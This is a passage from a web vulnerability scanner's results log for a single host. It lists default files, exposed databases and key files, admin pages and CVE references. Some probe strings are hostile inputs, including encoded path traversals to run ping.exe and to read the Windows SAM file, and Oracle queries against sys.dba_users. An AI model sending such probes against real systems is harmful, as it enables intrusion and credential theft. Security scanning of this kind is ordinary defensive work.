++ [002841] /_private/register.txt: Default FrontPage file found. See: https://en.wikipedia.org/wiki/Microsoft_FrontPage
++ [002846] /_vti_bin/admin.pl: Default FrontPage CGI found. See: https://en.wikipedia.org/wiki/Microsoft_FrontPage
++ [002850] /_vti_bin/fpadmin.htm: Default FrontPage CGI found. See: https://en.wikipedia.org/wiki/Microsoft_FrontPage
++ [002853] /_vti_bin/_vti_cnf/: FrontPage directory found. See: https://en.wikipedia.org/wiki/Microsoft_FrontPage
++ [002857] /_vti_pvt/administrators.pwd: Default FrontPage file found, may be a password file. See: https://en.wikipedia.org/wiki/Microsoft_FrontPage
++ [002871] /help/contents.htm: Default Netscape manual found. All default pages should be removed. See: CWE-552
++ [002873] /manual/ag/esperfrm.htm: Default Netscape manual found. All default pages should be removed. See: CWE-552
++ [002875] /com/novell/gwmonitor/help/en/default.htm: Netware gateway monitor access documentation found. All default documentation should be removed from web servers. See: CWE-552
++ [002878] /servlet/AdminServlet: Netware Web Search Server (adminservlet) found. All default code should be removed from web servers. See: CWE-552
++ [002879] /servlet/gwmonitor: Netware Gateway monitor found. All default code should be removed from web servers. See: CWE-552
++ [002880] /servlet/PrintServlet: Novell Netware default servlet found. All default code should be removed from the system. See: CWE-552
++ [002886] /servlet/webpub: Netware Web Publisher found. All default code should be removed from web servers. See: CWE-552
++ [002943] /index.html.ca: Apache default foreign language file found. All default files should be removed from the web server as they may give an attacker additional system information. See: CWE-552
++ [002945] /index.html.de: Apache default foreign language file found. All default files should be removed from the web server as they may give an attacker additional system information. See: CWE-552
++ [002948] /index.html.el: Apache default foreign language file found. All default files should be removed from the web server as they may give an attacker additional system information. See: CWE-552
++ [002949] /index.html.en: Apache default foreign language file found. All default files should be removed from the web server as they may give an attacker additional system information. See: CWE-552
++ [002952] /index.html.fr: Apache default foreign language file found. All default files should be removed from the web server as they may give an attacker additional system information. See: CWE-552
++ [002960] /index.html.nl: Apache default foreign language file found. All default files should be removed from the web server as they may give an attacker additional system information. See: CWE-552
++ [002969] /index.html.ru.koi8-r: Apache default foreign language file found. All default files should be removed from the web server as they may give an attacker additional system information. See: CWE-552
++ [002971] /index.html.se: Apache default foreign language file found. All default files should be removed from the web server as they may give an attacker additional system information. See: CWE-552
++ [002974] /index.html.var: Apache default foreign language file found. All default files should be removed from the web server as they may give an attacker additional system information. See: CWE-552
++ [002979] /iissamples/sdk/asp/docs/codebrw2.asp: This is a default IIS script/file that should be removed. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0739,https://docs.microsoft.com/en-us/security-updates/securitybulletins/2099/MS99-013
++ [002980] /iissamples/sdk/asp/docs/codebrws.asp: This is a default IIS script/file that should be removed. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0739,https://docs.microsoft.com/en-us/security-updates/securitybulletins/2099/MS99-013
++ [002994] /a/: May be Kebi Web Mail administration menu. See: CWE-552
++ [003026] /consport.chl+: Abyss allows hidden/protected files to be served if a + is added to the request. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1081
++ [003027] /general.chl+: Abyss allows hidden/protected files to be served if a + is added to the request. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1081
++ [003028] /srvstatus.chl+: Abyss allows hidden/protected files to be served if a + is added to the request. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1081
++ [003088] /surf/scwebusers: SurfControl SuperScout Web Reports Server user and password file is available. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0705
++ [003091] /_private/form_results.html: This file may contain information submitted by other web users via forms. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-1052
++ [003092] /_private/form_results.txt: This file may contain information submitted by other web users via forms. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-1052
++ [003135] /isqlplus: Oracle iSQL*Plus is installed. This may be vulnerable to a buffer overflow in the user ID field. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1264
++ [003136] /data/member_log.txt: Teekai's forum full 1.2 member's log can be retrieved remotely. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-2057
++ [003146] /metacart/database/metacart.mdb: MetaCart2 is an ASP shopping cart. The database of customers is available via the web. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0943 https://packetstormsecurity.com/files/32406/xmas.txt.html
++ [003148] /shoponline/fpdb/shop.mdb: MetaCart2 is an ASP shopping cart. The database of customers is available via the web. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0943 https://packetstormsecurity.com/files/32406/xmas.txt.html
++ [003162] /ban.log: Bannermatic versions 1-3 reveal sensitive information from unprotected files. These files should be protected. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-2342
++ [003163] /banmat.pwd: Bannermatic versions 1-3 reveal sensitive information from unprotected files. These files should be protected. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-2342
++ [003165] /admin/datasource.asp: Xpede page reveals SQL account name. The /admin directory should be protected. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0579
++ [003183] /texis.exe/?-version: Texis installation may reveal sensitive information. See: OSVDB-4314
++ [003200] /acart2_0/acart2_0.mdb: Alan Ward A-Cart 2.0 allows remote user to read customer database file which may contain usernames, passwords, credit cards and more. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-2948
++ [003202] /Sites/Knowledge/Membership/Inspired/ViewCode.asp: The default ViewCode.asp can allow an attacker to read any file on the machine. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0737,https://docs.microsoft.com/en-us/security-updates/securitybulletins/2099/MS99-013
++ [003204] /Sites/Samples/Knowledge/Membership/Inspired/ViewCode.asp: The default ViewCode.asp can allow an attacker to read any file on the machine. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0737,https://docs.microsoft.com/en-us/security-updates/securitybulletins/2099/MS99-013
++ [003206] /Sites/Samples/Knowledge/Push/ViewCode.asp: The default ViewCode.asp can allow an attacker to read any file on the machine. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0737,https://docs.microsoft.com/en-us/security-updates/securitybulletins/2099/MS99-013
++ [003211] /securelogin/1,2345,A,00.html: Vignette Story Server v4.1, 6, may disclose sensitive information via a buffer overflow. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0385
++ [003289] /MWS/HandleSearch.html?searchTarget=test&B1=Submit: MyWebServer 1.0.2 may be vulnerable to a buffer overflow (untested). Upgrade to a later version if 990b of searched data crashes the server. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1452
++ [003313] /cgi-bin/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%57%69%6E%64%6F%77%73%2Fping.exe%20127.0.0.1: AnalogX SimpleServer:WWW HTTP vulnerability allows specially formatted strings to perform command execution. Upgrade to version 1.15 or higher. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-1586
++ [003314] /dc/auth_data/auth_user_file.txt: The DCShop installation allows credit card numbers to be viewed remotely. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0821 https://packetstormsecurity.com/files/32406/xmas.txt.html
++ [003315] /dc/orders/orders.txt: The DCShop installation allows credit card numbers to be viewed remotely. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0821 https://packetstormsecurity.com/files/32406/xmas.txt.html
++ [003329] /applist.asp: Citrix server may allow remote users to view applications installed without authenticating. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0502
++ [003330] /launch.asp?NFuse_Application=LookOut&NFuse_MIMEExtension=.ica: Citrix server may reveal sensitive information by accessing the 'advanced' tab on the login screen. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0301
++ [003366] /..%255c..%255c..%255c..%255c..%255c../winnt/repair/sam._: BadBlue server is vulnerable to multiple remote exploits. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0325
++ [003413] /j2ee/: j2ee directory found--possibly an Oracle app server directory. See: CWE-552
++ [003419] /webcache/webcache.xml: Oracle WebCache Demo. See: CWE-552
++ [003420] /bmp/: SQLJ Demo Application. See: CWE-552
++ [003421] /bmp/global-web-application.xml: SQLJ Demo Application. See: CWE-552
++ [003424] /bmp/README.txt: SQLJ Demo Application. See: CWE-552
++ [003427] /ptg_upgrade_pkg.log: Oracle log files. See: CWE-552
++ [003430] /_pages/_webapp/_admin/_showpooldetails.java: Oracle JSP files. See: CWE-552
++ [003431] /_pages/_webapp/_admin/_showjavartdetails.java: Oracle JSP file. See: CWE-552
++ [003435] /OA_HTML/_pages/: Oracle JSP file. See: CWE-552
++ [003436] /OA_HTML/webtools/doc/index.html: Cabo DHTML Components Help Page. See: CWE-552
++ [003437] /reports/rwservlet?server=repserv+report=/tmp/hacker.rdf+destype=cache+desformat=PDF: Oracle Reports rwservlet report Variable Arbitrary Report Executable Execution. See: https://www.exploit-db.com/exploits/26006
++ [003446] /reports/rwservlet/showenv: Oracle Reports. See: CWE-552
++ [003447] /reports/rwservlet/showmap: Oracle Reports. See: CWE-552
++ [003448] /reports/rwservlet/showjobs: Oracle Reports. See: CWE-552
++ [003449] /reports/rwservlet/getjobid7?server=myrep: Oracle Reports. See: CWE-552
++ [003450] /reports/rwservlet/getjobid4?server=myrep: Oracle Reports. See: CWE-552
++ [003451] /reports/rwservlet/showmap?server=myserver: Oracle Reports. See: CWE-552
++ [003452] /pls/portal/owa_util.cellsprint?p_theQuery=select: Direct access to Oracle packages could have an unknown impact.
++ [003454] /pls/portal/owa_util.show_query_columns?ctable=sys.dba_users: Access to Oracle pages could have an unknown impact.
++ [003456] /pls/portal/owa_util.cellsprint?p_theQuery=select+*+from+sys.dba_users: Access to Oracle pages could have an unknown impact.
++ [003457] /pls/portal/owa_util.signature: Access to Oracle pages could have an unknown impact.
++ [003460] /pls/portal/PORTAL_DEMO.ORG_CHART.SHOW: Access to Oracle pages could have an unknown impact.
++ [003462] /pls/portal/PORTAL.wwv_ui_lovf.show: Access to Oracle pages could have an unknown impact.
++ [003464] /pls/portal/PORTAL.wwv_dynxml_generator.show: Access to Oracle pages could have an unknown impact.
++ [003468] /pls/portal/SELECT: Access to Oracle pages could have an unknown impact.
++ [003471] /OA_HTML/META-INF/: Oracle Applications portal pages found.
++ [003477] /OA_JAVA/Oracle/: Oracle Applications portal pages found.
++ [003481] /OA_HTML/jsp/: Oracle Applications portal page found. See: CWE-552
++ [003483] /OA_HTML/jsp/fnd/fndhelp.jsp?dbc=/u01/oracle/prodappl/fnd/11.5.0/secure/dbprod2_prod.dbc: Oracle Applications help page found. See: CWE-552
++ [003487] /cehttp/trace: Sterling Commerce Connect Direct trace log file may contain user ID information.
++ [003488] /cehttp/property/: Sterling Commerce Connect Direct configuration files.
++ [003550] /doc/vxvm/vxvm_ig.pdf: Veritas Volume Manager documentation. See: CWE-552
++ [003574] /upgrade.php: upgrade.php was found.
++ [003590] /webservices/IlaWebServices: Host has the Oracle iLearning environment installed.
++ [003602] /al/: This might be interesting: potential country code (Albania).
++ [003615] /az/: This might be interesting: potential country code (Azerbaijan).
++ [003629] /bv/: This might be interesting: potential country code (Bouvet Island).
++ [003632] /bn/: This might be interesting: potential country code (Brunei Darussalam).
++ [003637] /cm/: This might be interesting: potential country code (Cameroon).
++ [003639] /cv/: This might be interesting: potential country code (Cape Verde).
++ [003641] /cf/: This might be interesting: potential country code (Central African Republic).
++ [003644] /cn/: This might be interesting: potential country code (China).
++ [003645] /cx/: This might be interesting: potential country code (Christmas Island).
++ [003652] /cr/: This might be interesting: potential country code (Costa Rica).
++ [003659] /dj/: This might be interesting: potential country code (Djibouti).
++ [003664] /sv/: This might be interesting: potential country code (El Salvador).
++ [003670] /fo/: This might be interesting: potential country code (Faroe Islands).
++ [003671] /fj/: This might be interesting: potential country code (Fiji).
++ [003673] /fr/: This might be interesting: potential country code (France).
++ [003683] /gr/: This might be interesting: potential country code (Greece).
++ [003685] /gd/: This might be interesting: potential country code (Grenada).
++ [003689] /gg/: This might be interesting: potential country code (Guernsey).
++ [003697] /hk/: This might be interesting: potential country code (Hong Kong).
++ [003698] /hu/: This might be interesting: potential country code (Hungary).
++ [003701] /id/: This might be interesting: potential country code (Indonesia).
++ [003702] /ir/: This might be interesting: potential country code (Islamic Republic Of Iran).
++ [003719] /la/: This might be interesting: potential country code (Lao People's Democratic Republic).
++ [003721] /lb/: This might be interesting: potential country code (Lebanon).
++ [003723] /lr/: This might be interesting: potential country code (Liberia).
++ [003727] /lu/: This might be interesting: potential country code (Luxembourg).
++ [003735] /mt/: This might be interesting: potential country code (Malta).
++ [003736] /mh/: This might be interesting: potential country code (Marshall Islands).
++ [003741] /mx/: This might be interesting: potential country code (Mexico).
++ [003742] /fm/: This might be interesting: potential country code (Federated States Of Micronesia).
++ [003743] /md/: This might be interesting: potential country code (Republic Of Moldova).
++ [003749] /mz/: This might be interesting: potential country code (Mozambique).
++ [003750] /mm/: This might be interesting: potential country code (Myanmar).
++ [003755] /an/: This might be interesting: potential country code (Netherlands Antilles).
++ [003764] /no/: This might be interesting: potential country code (Norway).
++ [003770] /pg/: This might be interesting: potential country code (Papua New Guinea).
++ [003772] /pe/: This might be interesting: potential country code (Peru).
++ [003786] /lc/: This might be interesting: potential country code (Saint Lucia).
++ [003787] /mf/: This might be interesting: potential country code (Saint Martin).
++ [003788] /pm/: This might be interesting: potential country code (Saint Pierre And Miquelon).
++ [003795] /rs/: This might be interesting: potential country code (Serbia).
++ [003797] /sl/: This might be interesting: potential country code (Sierra Leone).
++ [003799] /sk/: This might be interesting: potential country code (Slovakia).
++ [003805] /es/: This might be interesting: potential country code (Spain).
++ [003808] /sr/: This might be interesting: potential country code (Suriname).
++ [003811] /se/: This might be interesting: potential country code (Sweden).
++ [003813] /sy/: This might be interesting: potential country code (Syrian Arab Republic).
++ [003819] /tg/: This might be interesting: potential country code (Togo).
++ [003825] /tm/: This might be interesting: potential country code (Turkmenistan).
++ [003827] /tv/: This might be interesting: potential country code (Tuvalu).
++ [003829] /ua/: This might be interesting: potential country code (Ukraine).
++ [003837] /ve/: This might be interesting: potential country code (Venezuela).
++ [003843] /ye/: This might be interesting: potential country code (Yemen).
++ [006186] /license.txt: License file found may identify site software.
++ [006206] /data/readme.txt: Readme file found.
++ [006208] /logs/readme.txt: Readme file found.
++ [006215] /admin1.php: Admin login page found.
++ [006218] /admin/account.asp: Admin login page/section found.
++ [006223] /admin/controlpanel.php: Admin login page/section found.
++ [006225] /admin/cp.html: Admin login page/section found.
++ [006226] /admin/cp.php: Admin login page/section found.
++ [006229] /admin/index.asp: Admin login page/section found.
++ [006232] /admin/login.html: Admin login page/section found.
++ [006242] /admincontrol.asp: Admin login page/section found.
++ [006245] /administer/: Admin login page/section found.
++ [006249] /administr8/: Admin login page/section found.
++ [006250] /administracao.php: Admin login page/section found.
++ [006259] /administration.html: Admin login page/section found.
++ [006263] /administrator.html: Admin login page/section found.
++ [006275] /administrators/: Admin login page/section found.
++ [006277] /adminisztrátora.php: Admin login page/section found.
++ [006279] /adminpanel.asp: Admin login page/section found.
++ [006286] /admins/: Admin login page/section found.
++ [006287] /AdminTools/: Admin login page/section found.
++ [006288] /amministratore.php: Admin login page/section found.
++ [006289] /amministratore/: Admin login page/section found.
++ [006291] /banneradmin/: Admin login page/section found.
++ [006297] /cadmins/: Admin login page/section found.
++ [006299] /ccms/index.php: Admin login page/section found.
++ [006300] /ccms/login.php: Admin login page/section found.
++ [006306] /controlpanel.html: Admin login page/section found.
++ [006307] /controlpanel.php: Admin login page/section found.
++ [006310] /cp.html: Admin login page/section found.
++ [006315] /Database_Administration/: Admin login page/section found.
++ [006317] /directadmin/: Admin login page/section found.
++ [006320] /fileadmin.html: Admin login page/section found.
++ [006322] /formslogin/: Admin login page/section found.
++ [006330] /login-us/: Admin login page/section found.
++ [006336] /logo_sysadmin/: Admin login page/section found.
++ [006346] /moderator.html: Admin login page/section found.
++ [006349] /moderator/admin.asp: Admin login page/section found.
++ [006352] /moderator/login.asp: Admin login page/section found.
++ [006358] /openvpnadmin/: Admin login page/section found.
++ [006371] /rcLogin/: Admin login page/section found.
++ [006377] /showlogin/: Admin login page/section found.
++ [006387] /sys-admin/: Admin login page/section found.
++ [006388] /sysadmin.asp: Admin login page/section found.
++ [006393] /SysAdmin2/: Admin login page/section found.
++ [006403] /UserLogin/: Admin login page/section found.
++ [006404] /utility_login/: Admin login page/section found.
++ [006407] /vmailadmin/: Admin login page/section found.
++ [006418] /yonetici.html: Admin login page/section found.
++ [006420] /yonetim.asp: Admin login page/section found.
++ [006426] /maintenance.asp: This might be interesting.
++ [006431] /maint.aspx: This might be interesting.
++ [006434] /jk-status: Apache mod_jk status page is visible.
++ [006528] /.svn/entries: Subversion Entries file may contain directory listing information. See: http://pen-testing.sans.org/blog/pen-testing/2012/12/06/all-your-svn-are-belong-to-us
++ [006530] /.git/index: Git Index file may contain directory listing information.
++ [006531] /.hg/dirstate: Mercurial DirState file may contain directory listing information.
++ [006677] /adfs/fs/federationserverservice.asmx: Active Directory Federation Services page found. See: https://docs.microsoft.com/en-us/windows-server/identity/ad-fs/ad-fs-overview
++ [006679] /adfs/services/trust/mexsoap: Active Directory Federation Services page found. See: https://docs.microsoft.com/en-us/windows-server/identity/ad-fs/ad-fs-overview
++ [006690] /adfs/services/trust/13/kerberosmixed: Active Directory Federation Services page found. See: https://docs.microsoft.com/en-us/windows-server/identity/ad-fs/ad-fs-overview
++ [006693] /adfs/services/trust/13/issuedtokenmixedasymmetricbasic256: Active Directory Federation Services page found. See: https://docs.microsoft.com/en-us/windows-server/identity/ad-fs/ad-fs-overview
++ [006701] /Federationmetadata/2007-06/FederationMetadata.xml: Active Directory Federation Services page found. See: https://docs.microsoft.com/en-us/windows-server/identity/ad-fs/ad-fs-overview
++ [006713] /fantastico_fileslist.txt: fantastico_fileslist.txt file found. This file contains a list of all the files from the current directory.
++ [006729] /system/console/configMgr: OSGi Apache Felix console.
++ [006730] /system/console/bundles: OSGi Apache Felix console.
++ [006735] /etc/cloudservices: Adobe Experience Manager Cloud Service Information.
++ [006736] /etc/reports: Adobe Experience Manager Reports.
++ [006756] /rsa: Encryption key exposed.
++ [006758] /dsa: Encryption key exposed.
++ [006763] /id_dsa.old: Encryption key exposed.
++ [006793] /encrypt.jsp: This might be interesting.
++ [006794] /decrypt.jsp: This might be interesting.
++ [006886] /_Layouts/AreaWelcomePage.aspx: FrontPage/Sharepointfile available.
++ [006888] /_Layouts/ChangeSiteMasterPage.aspx: FrontPage/Sharepointfile available.
++ [006893] /_layouts/images/: FrontPage/Sharepointfile available.
++ [006898] /_layouts/mngctype.aspx: FrontPage/Sharepointfile available.
++ [006903] /_layouts/mobile/mbllists.aspx: FrontPage/Sharepointfile available.
++ [006908] /_layouts/NewDwp.aspx: FrontPage/Sharepointfile available.
++ [006912] /_layouts/PageSettings.aspx: FrontPage/Sharepointfile available.
++ [006922] /_layouts/recyclebin.aspx: FrontPage/Sharepointfile available.
++ [006923] /_Layouts/RedirectPage.aspx: FrontPage/Sharepointfile available.
++ [006934] /_layouts/userdisp.aspx?ID=1: FrontPage/Sharepointfile available.
++ [006951] /_catalogs/wp/Forms/AllItems.aspx: FrontPage/Sharepointfile available.
++ [006952] /_catalogs/wt/Forms/Common.aspx: FrontPage/Sharepointfile available.
++ [006954] /_vti_pvt/botsinf.cnf: FrontPage/Sharepointfile available.
++ [007203] /userdata.json: This might be interesting.
++ [007204] /login.json: This might be interesting.
++ [007205] /master.json: This might be interesting.
++ [007206] /masters.json: This might be interesting.
++ [007207] /connections.json: This might be interesting.
++ [007208] /connection.json: This might be interesting.
++ [007210] /PasswordsData.json: This might be interesting.
++ [007211] /users.json: This might be interesting.
++ [007212] /conndb.json: This might be interesting.
++ [007213] /conn.json: This might be interesting.
++ [007215] /accounts.json: This might be interesting.
++ [007224] /.gitignore: .gitignore file found. It is possible to grasp the directory structure.
++ [007303] /JAMonAdmin.jsp: JAMon - Java Application Monitor Admin interface identified. Versions 2.7 and earlier contain XSS vulnerabilities. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-6235
++ [007342] /: X-Frame-Options header is deprecated and was replaced with the Content-Security-Policy HTTP header with the frame-ancestors directive. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/X-Frame-Options
++ [007352] /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ 8508 requests: 4 errors and 547 items reported on the remote host
++ End Time:           2026-08-04 18:02:00 (GMT-4) (5408 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
